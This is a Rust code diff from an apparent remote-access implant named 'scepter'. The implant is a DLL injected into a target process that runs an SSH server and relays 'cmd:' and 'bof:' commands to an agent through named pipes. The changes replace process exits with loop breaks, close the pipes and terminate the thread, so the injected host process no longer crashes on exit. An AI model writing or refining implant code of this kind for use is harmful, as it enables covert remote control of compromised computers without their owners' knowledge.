@@ -4,7 +4,7 @@
 
 use std::collections::HashMap;
 use std::os::raw::c_void;
-use windows_sys::Win32::Foundation::{BOOL, HANDLE};
+use windows_sys::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
 
 use debug_print::{debug_eprintln, debug_println};
 use rand_core::OsRng;
@@ -14,7 +14,7 @@ use std::sync::Arc;
 use std::thread;
 use tokio::runtime::Runtime;
 use tokio::sync::Mutex;
-
+use windows_sys::Win32::System::Threading::{GetCurrentThread, TerminateThread};
 pub use scepter_common::*;
 
 static mut G_H_INPUT_PIPE: HANDLE = 0 as HANDLE;
@@ -80,7 +80,7 @@ pub async fn dll_main() {
         // Check if either pipe is None, and return early if so
         if pipes.0.is_none() || pipes.1.is_none() {
             debug_println!("Failed to initialize one or both pipes");
-            std::process::exit(1);
+            std::process::exit(1); // TODO Fix this, this will crash the injection target
         }
 
         unsafe {
@@ -98,6 +98,20 @@ pub async fn dll_main() {
         rt.block_on(async {
             sh_clone.command_loop().await;
         });
+
+        // TODO Find a way to close the SSH sessions so that the port can be reused
+
+        // If we make it here we can close the pipes
+        unsafe {
+            CloseHandle(G_H_INPUT_PIPE);
+            CloseHandle(G_H_OUTPUT_PIPE);
+        }
+
+        // If we make it here we exited the command loop, so shutdown the runtime
+        rt.shutdown_background();
+
+        // If we're here shutting down the runtime didn't exit this thread, terminate
+        unsafe { TerminateThread(GetCurrentThread(), 0); }
     });
 
     let interface_port = str::from_utf8(SSH_PORT)
@@ -149,7 +163,7 @@ impl Server {
             };
             let input = input.trim_matches(char::from(0));
             if input.eq("exit") {
-                std::process::exit(0);
+                break;
             }
             if input.starts_with("cmd:") || input.starts_with("bof:") {
                 debug_println!("Sending command to agent: {}", input);
@@ -171,7 +185,7 @@ impl Server {
             }
             let input = input.trim_matches(char::from(0));
             if input.eq("exit") {
-                std::process::exit(0);
+                break;
             }
             if input.starts_with("cmd:") || input.starts_with("bof:") {
                 self.post(CryptoVec::from(input)).await;
